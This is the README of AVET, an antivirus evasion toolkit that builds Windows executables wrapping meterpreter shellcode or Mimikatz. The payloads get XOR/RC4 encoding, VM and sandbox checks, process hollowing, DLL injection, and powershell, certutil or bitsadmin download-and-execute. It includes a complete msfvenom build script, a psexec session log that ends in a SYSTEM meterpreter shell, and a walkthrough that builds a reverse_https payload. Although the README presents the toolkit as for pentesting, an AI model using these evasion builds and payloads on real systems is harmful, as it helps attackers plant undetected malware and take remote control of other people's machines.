AntiVirus Evasion Tool
======================

AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques, as well as other methods used by malicious software.
For an overview of new features in **v2.1**, as well as past version increments, have a look at the **CHANGELOG** file.

Version 2 came with a large architectural overhaul, which shifted the specifics for building the output executable from
the internal C code to configuring mostly everything in the build script, providing a small configuration command language.
This makes the configuration process more intuitive overall.

Furthermore, the underlying code is now more modular, which eases the addition of new features.

With the new architecture and features you are now quite flexible in building your executable.
You may, for example, download your encrypted paylaod via powershell, while supplying the decryption key via command line argument at execution time, and finally inject your payload into another process, choosing from multiple techniques.
You may also add initial command executions and environmental sandbox checks.
Chaining multiple iterations of AVET enables you to add multiple evasion layers, if necessary.

What & Why:
- when running a .exe file made with msfpayload & co, the file will often be recognized by antivirus software
- AVET is an antivirus evasion tool targeting windows machines with executable files
- different kinds of input payloads can be used now: shellcode, exe and dlls
- more techniques available: shellcode/dll injection, process hollowing and more
- flexible retrieval methods for payload, decryption key, etc.


Installation
------------

__This README applies for Kali 64bit and tdm-gcc!__

You can use the setup script:
```
./setup.sh
```

This should automatically get you started by installing/configuring wine and installing tdm-gcc.
You'll shortly have to click through the tdm-gcc installer GUI though - standard settings should be fine.


If for whatever reason you want to do things manually:

How to install tdm-gcc with wine:
[https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)


Important Note
--------------
Not all techniques will evade every AV engine. If one technique or build script does not work, please test another one.
Feel free to experiment! After all this is a toolbox - yet you should wield the hammer yourself.


How to use 
----------

Of course it is possible to run all commands step by step from command line. However, in the "build" folder you will find preconfigured build scripts for relevant use cases. 
The build scripts themselves are written so as they have to be called from within the avet directory:
```
root@kalidan:~/tools/avet# ./build/build_fopen_mtrprtrxor_revhttps_win64.sh
```

You can define default LHOST and LPORT values for metasploit payloads in the `/build/global_connect_config.sh` file, which are used if you don't redefine.


Usage examples
--------------

Generate a 32-bit process hollowing executable in two steps (as in build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win32.sh):

First, generate the hollowing payload with AVET:

- generate meterpreter/reverse_https 32-bit shellcode
- the meterpreter shellcode will be XOR encrypted with a 5-byte preset key
- the shellcode will be compiled into the generated executable
- fopen and gethostbyname sandbox evasion environmental checks will be made before executing the shellcode
	
Second, build the "dropper" executable that delivers the first step payload via hollowing:
- statically compile the first step payload into the executable
- the payload will be XOR encrypted with a different 5-byte preset key
- again, fopen and gethostbyname sandbox evasion environmental checks will be made before hollowing
- the hollowing target PID will be delivered via command line argument on execution time
	
So you get a two-layer environmental-checked and encrypted meterpreter payload, hollowed into a process of your choice.
While the settings in the build script are mostly for demonstration purposes, there is a lot of flexibility to customize your generated executable by making simple modifications to the build script.

You could switch out data retrieval methods: Instead of statically compiling most data into the executable, you could download your hollowing payload via powershell, download the decryption key via sockets, use different encryption or environmental checks, etc.

Or try to add more evasion layers by doing a third build iteration.
Or switch out the payload. Want to use Mimikatz instead? Convert it into shellcode via https://github.com/hasherezade/pe_to_shellcode, and change the payload in the build script.

Of course, you can also design more minimalistic builds, like executing unencrypted shellcode with only one environmental check, or maybe 50 iterations of shikata are enough to reach your goal?
Choose/modify the build scripts, suiting your needs.


Build scripts
-------------
Below, find a list of all currently shipped build scripts. The names should hint at each script's functionality.
For detailed information, consider the comments inside the scripts.
Feel free to modify/write your own build scripts to build your custom executable!

```
build_40xshikata_revhttpsunstaged_win32.sh
build_50xshikata_quiet_revhttps_win32.sh
build_50xshikata_revhttps_win32.sh
build_asciimsf_fromcmd_revhttps_win32.sh
build_asciimsf_revhttps_win32.sh
build_avetenc_dynamicfromfile_revhttps_win32.sh
build_avetenc_fopen_revhttps_win32.sh
build_avetenc_mtrprtrxor_revhttps_win64.sh
build_calcfromcmd_50xshikata_revhttps_win32.sh
build_calcfrompowersh_50xshikata_revhttps_win32.sh
build_cpucores_revhttps_win32.sh
build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
build_dkmc_downloadexecshc_revhttps_win32.sh
build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
build_downloadbitsadmin_revhttps_win32.sh
build_downloadcertutil_revhttps_win32.sh
build_downloadiexplorer_revhttps_win32.sh
build_downloadpsh_revhttps_win32.sh
build_downloadsocket_mtrprtrxor_revhttps_win64.sh
build_downloadsocket_revhttps_win32.sh
build_dynamicfromfile_revhttps_win32.sh
build_fopen_mtrprtrxor_revhttps_win64.sh
build_fopen_quiet_revhttps_win32.sh
build_fopen_revhttps_win32.sh
build_gethostbyname_revhttps_win32.sh
build_hasvmkey_revhttps_win32.sh
build_hasvmmac_revtcp_win32.sh
build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
build_kaspersky_fopen_shellrevtcp_win32.sh
build_mimikatz_pe2shc_xorfromcmd_win64.sh
build_rc4enc_mimikatz_win64.sh
buildsvc_20xshikata_bindtcp_win32.sh
```

Features
--------

### Data retrieval methods
These methods are compatible with all of AVET's data sources and can be used as such in the build script.

A few examples:
```
# Compiles the command 'calc.exe' statically into the executable, which will then be executed via cmd at sample startup.
set_command_source static_from_here 'calc.exe'
set_command_exec exec_via_cmd

# Download 64-bit shellcode via powershell, and execute. 
set_payload_source download_powershell
set_payload_execution_method exec_shellcode64

# Download XOR decryption key into memory. (Server to download from is always specified via first command line argument on execution). Decode the payload.
set_key_source download_socket
set_decoder xor

# Retrieves the tuple (target PID, dll path) from command line on execution
set_payload_info_source from_command_line_raw
set_payload_execution_method inject_dll
```
If features are skipped/not used, you have to specify NOP-like behavior instead:
```
set_command_source no_data
set_command_exec no_command
```

##### static_from_file
The data is retrieved from a file and is statically compiled into the generated executable.
For this to work, the data must be provided as a c-style array at compilation time, like
```
unsigned char buf[] = "\x00\x11\x22\x33";
```

##### static_from_here
The data is statically compiled into the generated executable,
retrieved from the specified argument in the build script.

##### dynamic_from_file
The data is read from a file at run time.

##### from_command_line_hex
Retrieves data from a "11aabb22.." format hex string (from the command line).

##### from_command_line_raw
Retrieves data from a command line argument. The given ASCII string is interpreted as raw byte data.

##### download_certutil
Downloads data from a specified URI, using ```certutil.exe -urlcache -split -f```.
Drops the downloaded file to disk before reading the data.

##### download_internet_explorer
Downloads data from a specified URL, using Internet Explorer.
Drops the downloaded file to disk before reading the data.

##### download_powershell
Downloads data from a specified URI via powershell.
Drops the downloaded file to disk before reading the data.

##### download_socket
Downloads the data from a specified URI, using sockets.
Data is read directly into memory, no file is dropped to disk.

##### download_bitsadmin
Downloads the data using the BITSAdmin Windows utility.
Drops the downloaded file to disk before reading the data.


### Payload execution methods
How to execute/deliver the payload. The injection/hollowing methods require additional information about the injection target, which can be given via ```set_payload_info_source <the_info>``` (see data retrieval methods).

##### exec_shellcode
Executes 32-bit shellcode with a C function binding.

##### exec_shellcode64
Executes 64-bit shellcode with a C function binding and VirtualProtect.

##### exec_shellcode_ASCIIMSF
Executes ASCIIMSF encoded shellcode via ```call eax```.

##### hollowing32
Instanciates a new process, cuts out the original image and hollows the given payload into the new process.
The payload is a 32-bit executable image. Works on 32-bit targets.

##### hollowing64
Same as hollowing32, but using 64-bit PE payloads for 64-bit target processes.

##### inject_dll
Injects a dll into a target process, using ```CreateRemoteThread```.
Injection works for 32-bit payloads into 32-bit processes, and 64-bit payloads into 64-bit processes, respectively.

##### inject_shellcode
Injects shellcode into a target process, using ```CreateRemoteThread```.
Injection works for 32-bit shellcode into 32-bit processes, and 64-bit shellcode into 64-bit processes, respectively.


### Encryption/Encoding
AVET provides encoders for each scheme, which can be applied on the payload before compilation/delivery.
On execution, the specified decoder then again deobfuscates the payload at runtime.

Here is an RC4 example, where the decryption key is retrieved from the command line in hex format at execution time:
```
generate_key preset aabbccddee input/key_raw.txt
encode_payload rc4 input/shellcode_raw.txt input/shellcode_enc_raw.txt input/key_raw.txt
set_key_source from_command_line_hex
set_decoder rc4
```

You can also skip the encoding feature by not further encoding the shellcode, and setting:
```
set_key_source no_data
set_decoder none
```

##### xor
Rolling XOR, supporting multi-byte keys.

##### avet
Custom encoding, reinterpreting the ASCII format.

##### rc4
RC4 encryption/decryption, with flexible key length.


### Sandbox evasion
These are environmental checks that are performed before eventual encoding and payload execution.
If an unpleasant execution environment is detected (e.g. an AV sandbox), execution stops.

Currently, you can arbitrarily queue up to 10 checks. Using the same technique multiple times is supported.
The queue limit *EVASION_ARRAY_SIZE* can however be easily modified in *avet.c*.

##### fopen
Checks for the existence of a file. If not found, stop execution.
The file name can be specified in the build script, like
```
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
```

##### gethostbyname
Try to resolve a hostname of your choice. If gethostbyname returns unequals NULL, stop execution.
The hostname to check against can be specified in the build script, like
```
add_evasion gethostbyname_sandbox_evasion 'testdomain.com'
```

##### get_cpu_cores
Checks number of CPU cores on the target. If the number is lower than the specified value, stop execution.
```
add_evasion get_cpu_cores 2
```

##### has_vm_mac
Checks for vendor-specific MAC prefixes. If any identified, stop execution.
```
add_evasion has_vm_mac
```

##### has_vm_regkey
Checks for vendor-specific registry keys. If any identified, stop execution.
```
add_evasion has_vm_regkey
```

##### hide_console
Not really an evasion technique, but hides your console window ;)
```
add_evasion hide_console
```

### Additional command execution
Grants you the ability to execute an additional cmd/powershell payload directly after the eventual sandbox evasion functions.
The payload source is compatible with AVET's data retrieval methods.

The following example downloads a powershell payload via BITSAdmin: 
```
set_command_source download_bitsadmin
set_command_exec exec_via_powershell
```


### Helper tools

##### data_raw_to_c
Takes raw data as input from a file, converts it into C-array format and writes output to another file.
This aids in providing the correct format for the static_from_file data retrieval method.

##### generate_key
Key generation utility. Generates either a (non-cryptographically) random key or takes a preset key as input,
and outputs the raw key data into a specified file.
This aids in providing key material for the AVET encryption feature.

##### sh_format
Utility from AVET 1.3 that performs AVET encoding.


AVET & metasploit psexec
------------------------
AVET is compatible to metasploit's psexec module. For that, the generated executable needs to be compiled as a Windows Service, which is implemented by using *avetsvc.c*. Consider the corresponding example build script

*build_svc_20xshikata_bindtcp_win32.sh*:

```
#!/bin/bash          
# Designed for use with msf psexec module!

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT

# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f raw -a x86 --platform Windows > input/sc_raw.txt

# import feature construction interface
. build/feature_construction.sh

# add evasion techniques
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion gethostbyname_sandbox_evasion 'this.that'

# generate key file
generate_key preset aabbcc12de input/key_raw.txt

# encode shellcode
encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# no command preexec
set_command_source no_data
set_command_exec no_command

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source no_data

# set decoder
set_decoder xor

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# enable debug printing
enable_debug_print to_file C:/avetdbg.txt

# compile as service
$win32_compiler -o output/service.exe source/avetsvc.c -lws2_32
strip output/service.exe

# cleanup
cleanup_techniques
```

And on the metasploit side:
```
msf exploit(psexec) > use exploit/windows/smb/psexec
msf exploit(psexec) > set EXE::custom /root/tools/ave/pwn.exe
EXE::custom => /root/tools/ave/pwn.exe
msf exploit(psexec) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(psexec) > set rhost 192.168.116.183
rhost => 192.168.116.183
msf exploit(psexec) > set smbuser dax
smbuser => dax
msf exploit(psexec) > set smbpass test123
smbpass => test123
msf exploit(psexec) > set lport 8443
lport => 8443
msf exploit(psexec) > run

[*] 192.168.116.183:445 - Connecting to the server...
[*] Started bind handler
[*] 192.168.116.183:445 - Authenticating to 192.168.116.183:445 as user 'dax'...
[*] Sending stage (957487 bytes) to 192.168.116.183
[*] 192.168.116.183:445 - Selecting native target
[*] 192.168.116.183:445 - Uploading payload...
[*] 192.168.116.183:445 - Using custom payload /root/tools/avepoc/a.exe, RHOST and RPORT settings will be ignored!
[*] 192.168.116.183:445 - Created \mzrCIOVg.exe...
[+] 192.168.116.183:445 - Service started successfully...
[*] 192.168.116.183:445 - Deleting \mzrCIOVg.exe...
[-] 192.168.116.183:445 - Delete of \mzrCIOVg.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)
[*] Exploit completed, but no session was created.
msf exploit(psexec) > [*] Meterpreter session 4 opened (192.168.116.142:33453 -> 192.168.116.183:8443) at 2017-05-27 18:47:23 +0200

msf exploit(psexec) > sessions

Active sessions
===============

Id Type Information Connection
-- ---- ----------- ----------
4 meterpreter x86/windows NT-AUTORIT_T\SYSTEM @ DAX-RYMZ48Z3EYO 192.168.116.142:33453 -> 192.168.116.183:8443 (192.168.116.183)

msf exploit(psexec) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer : DAX-RYMZ48Z3EYO
OS : Windows XP (Build 2600, Service Pack 3).
Architecture : x86
System Language : de_DE
Domain : ARBEITSGRUPPE
Logged On Users : 2
Meterpreter : x86/windows
```


## AVET Fabric

**avet_fabric** is a small Python utility which was designed to assist you in using the tool.

It lists all scripts that are currently present in the build folder. After selecting one, you will be able to step through the script line by line, having the opportunity to modify the contents on the fly.

The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric. 
You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.

These modifications are temporary, which means that any changes you made will not persist in the build script on disk.
The modified version is executed once, and your executable built.

Here's a quick example (python3 || gtfo):
```
python3 avet_fabric.py 

                       .|        ,       +
             *         | |      ((             *
                       |'|       `    ._____
         +     ___    |  |   *        |.   |' .---"|
       _    .-'   '-. |  |     .--'|  ||   | _|    |
    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
    |' | |.    |    ||       | |   |  |    ||      |
 ___|  '-'     '    ""       '-'   '-.'    '`      |____
jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

AVET Fabric by Daniel Sauder, Florian Saager

avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.

0: build_40xshikata_revhttpsunstaged_win32.sh
1: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
2: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
3: build_calcfromcmd_50xshikata_revhttps_win32.sh
4: build_avetenc_fopen_revhttps_win32.sh
5: build_fopen_quiet_revhttps_win32.sh
6: build_downloadpsh_revhttps_win32.sh
7: build_avetenc_mtrprtrxor_revhttps_win64.sh
8: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
9: buildsvc_20xshikata_bindtcp_win32.sh
10: build_downloadbitsadmin_revhttps_win32.sh
11: build_cpucores_revhttps_win32.sh
12: build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
13: build_asciimsf_revhttps_win32.sh
14: build_downloadsocket_revhttps_win32.sh
15: build_calcfrompowersh_50xshikata_revhttps_win32.sh
16: build_avetenc_dynamicfromfile_revhttps_win32.sh
17: build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
18: build_downloadcertutil_revhttps_win32.sh
19: build_downloadsocket_mtrprtrxor_revhttps_win64.sh
20: build_fopen_mtrprtrxor_revhttps_win64.sh
21: build_asciimsf_fromcmd_revhttps_win32.sh
22: build_fopen_revhttps_win32.sh
23: build_kaspersky_fopen_shellrevtcp_win32.sh
24: build_hasvmmac_revtcp_win32.sh
25: build_rc4enc_mimikatz_win64.sh
26: build_dkmc_downloadexecshc_revhttps_win32.sh
27: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
28: build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
29: build_50xshikata_quiet_revhttps_win32.sh
30: build_hasvmkey_revhttps_win32.sh
31: build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
32: build_50xshikata_revhttps_win32.sh
33: build_mimikatz_pe2shc_xorfromcmd_win64.sh
34: build_downloadiexplorer_revhttps_win32.sh
35: build_dynamicfromfile_revhttps_win32.sh
36: build_gethostbyname_revhttps_win32.sh
Input number of the script you want use and hit enter: 4

Now you can edit the build script line by line.

Use AVET encoding.
print AVET logo
$ cat banner.txt
include script containing the compiler var $win32_compiler
you can edit the compiler in build/global_win32.sh
or enter $win32_compiler="mycompiler" here
$ . build/global_win32.sh
import feature construction interface
$ . build/feature_construction.sh
import global default lhost and lport values from build/global_connect_config.sh
$ . build/global_connect_config.sh
override connect-back settings here, if necessary
$ LPORT=$GLOBAL_LPORT
$ LHOST=$GLOBAL_LHOST
make meterpreter reverse payload, encoded with shikata_ga_nai
$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
encode the shellcode via AVET encoding.
$ encode_payload avet input/sc_c.txt input/scenc_raw.txt
add fopen sandbox evasion
$ add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
convert encoded shellcode file to c array style for static include
$ ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
no command preexec
$ set_command_source no_data
$ set_command_exec no_command
set shellcode source
$ set_payload_source static_from_file input/scenc_c.txt
set decoder and key source
AVET decoder needs no key
$ set_decoder avet
$ set_key_source no_data
set payload info source
$ set_payload_info_source no_data
set shellcode binding technique
$ set_payload_execution_method exec_shellcode
enable debug output
$ enable_debug_print
compile to output.exe file
$ $win32_compiler -o output/output.exe source/avet.c
$ strip output/output.exe
cleanup
$ cleanup_techniques

The following commands will be executed:
#/bin/bash
cat banner.txt
. build/global_win32.sh
. build/feature_construction.sh
. build/global_connect_config.sh
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
encode_payload avet input/sc_c.txt input/scenc_raw.txt
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
set_command_source no_data
set_command_exec no_command
set_payload_source static_from_file input/scenc_c.txt
set_decoder avet
set_key_source no_data
set_payload_info_source no_data
set_payload_execution_method exec_shellcode
enable_debug_print
$win32_compiler -o output/output.exe source/avet.c
strip output/output.exe
cleanup_techniques

Press enter to continue.

Building the output file...

Please stand by...

The output file should be placed in the output directory.

Bye...

```


More
====
For basics about antivirus evasion, AVET & more information have a look here (most for version 1.3): 
- [https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/](https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/)
- [https://govolution.wordpress.com/2017/06/11/avet-video/](https://govolution.wordpress.com/2017/06/11/avet-video/)
- [https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf](https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf)
- [https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf](https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf)
- [https://twitter.com/DanielX4v3r](https://twitter.com/DanielX4v3r)
- [https://github.com/govolution/avetosx](https://github.com/govolution/avetosx)
- [https://github.com/tacticaljmp](https://github.com/tacticaljmp)
- [https://github.com/Mr-Un1k0d3r/DKMC](https://github.com/Mr-Un1k0d3r/DKMC)
- [https://github.com/m0n0ph1/Basic-File-Crypter](https://github.com/m0n0ph1/Basic-File-Crypter)
- [https://github.com/hasherezade/pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)
- [https://github.com/hasherezade/demos/](https://github.com/hasherezade/demos/)
- [https://github.com/a0rtega/pafish](https://github.com/a0rtega/pafish)
- [https://danielsauder.com](https://danielsauder.com)

